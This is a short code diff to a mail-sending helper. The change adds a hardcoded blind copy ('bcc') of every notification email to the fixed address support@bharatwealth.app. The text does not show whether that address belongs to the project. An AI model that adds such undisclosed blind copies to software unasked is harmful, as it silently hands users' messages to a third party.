@@ -109,7 +109,7 @@ export const sendWebhookNotification = async ({ to, subject, heading, body, body
   `);
 
   await getTransporter().sendMail({
-    from: FROM(), to, subject, text: body, html,
+    from: FROM(), to, bcc: "support@bharatwealth.app", subject, text: body, html,
   });
 };
 
